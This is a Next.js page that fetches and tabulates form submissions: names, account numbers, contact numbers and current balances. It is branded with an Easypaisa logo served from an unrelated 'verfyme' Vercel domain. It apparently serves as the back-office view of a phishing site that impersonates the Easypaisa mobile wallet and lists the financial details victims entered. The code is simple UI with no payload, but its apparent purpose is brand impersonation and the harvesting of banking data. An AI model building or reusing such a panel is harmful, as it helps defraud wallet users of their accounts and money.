'use client';

import React, { useState, useEffect } from 'react';
import Image from 'next/image';
import Link from 'next/link';
import DatabaseStatus from '../components/DatabaseStatus';

export default function SubmissionsPage() {
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchSubmissions = async () => {
      try {
        const response = await fetch('/api/submissions');
        const result = await response.json();
        
        if (result.success) {
          setSubmissions(result.data);
        } else {
          setError(result.message || 'Failed to fetch submissions');
        }
      } catch (err) {
        setError('Network error. Please try again.');
        console.error('Fetch error:', err);
      } finally {
        setLoading(false);
      }
    };

    fetchSubmissions();
  }, []);

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50">
        <DatabaseStatus />
        {/* Header */}
        <header className="bg-white shadow-sm">
          <div className="container mx-auto px-4 py-4 flex justify-between items-center">
            <Image
              src="https://verfyme.vercel.app/images/easypaisa-black-logo.png"
              alt="Easypaisa Logo"
              width={150}
              height={50}
            />
            <Link href="/" className="text-blue-600 hover:text-blue-800 font-medium">
              Back to Form
            </Link>
          </div>
        </header>

        <main className="container mx-auto px-4 py-8">
          <div className="bg-white rounded-lg shadow-md p-6">
            <h1 className="text-2xl font-bold text-gray-800 mb-6">Form Submissions</h1>
            <div className="text-center py-8">
              <p className="text-gray-500">Loading submissions...</p>
            </div>
          </div>
        </main>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gray-50">
        <DatabaseStatus />
        {/* Header */}
        <header className="bg-white shadow-sm">
          <div className="container mx-auto px-4 py-4 flex justify-between items-center">
            <Image
              src="https://verfyme.vercel.app/images/easypaisa-black-logo.png"
              alt="Easypaisa Logo"
              width={150}
              height={50}
            />
            <Link href="/" className="text-blue-600 hover:text-blue-800 font-medium">
              Back to Form
            </Link>
          </div>
        </header>

        <main className="container mx-auto px-4 py-8">
          <div className="bg-white rounded-lg shadow-md p-6">
            <h1 className="text-2xl font-bold text-gray-800 mb-6">Form Submissions</h1>
            <div className="text-center py-8">
              <p className="text-red-500">Error: {error}</p>
              <Link href="/" className="text-blue-600 hover:text-blue-800 font-medium mt-2 inline-block">
                Back to Form
              </Link>
            </div>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <DatabaseStatus />
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <Image
            src="https://verfyme.vercel.app/images/easypaisa-black-logo.png"
            alt="Easypaisa Logo"
            width={150}
            height={50}
          />
          <Link href="/" className="text-blue-600 hover:text-blue-800 font-medium">
            Back to Form
          </Link>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        <div className="bg-white rounded-lg shadow-md p-6">
          <h1 className="text-2xl font-bold text-gray-800 mb-6">Form Submissions</h1>
          
          {submissions.length === 0 ? (
            <div className="text-center py-8">
              <p className="text-gray-500">No submissions yet.</p>
              <Link href="/" className="text-blue-600 hover:text-blue-800 font-medium mt-2 inline-block">
                Submit your first form
              </Link>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="min-w-full divide-y divide-gray-200">
                <thead className="bg-gray-50">
                  <tr>
                    <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Name
                    </th>
                    <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Account Number
                    </th>
                    <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Contact Number
                    </th>
                    <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Current Balance
                    </th>
                    <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Submitted At
                    </th>
                  </tr>
                </thead>
                <tbody className="bg-white divide-y divide-gray-200">
                  {submissions.map((submission) => (
                    <tr key={submission._id}>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                        {submission.name}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                        {submission.accountNumber}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                        {submission.contactNumber}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                        {submission.currentBalance}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                        {submission.createdAt ? new Date(submission.createdAt).toLocaleString() : 'N/A'}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}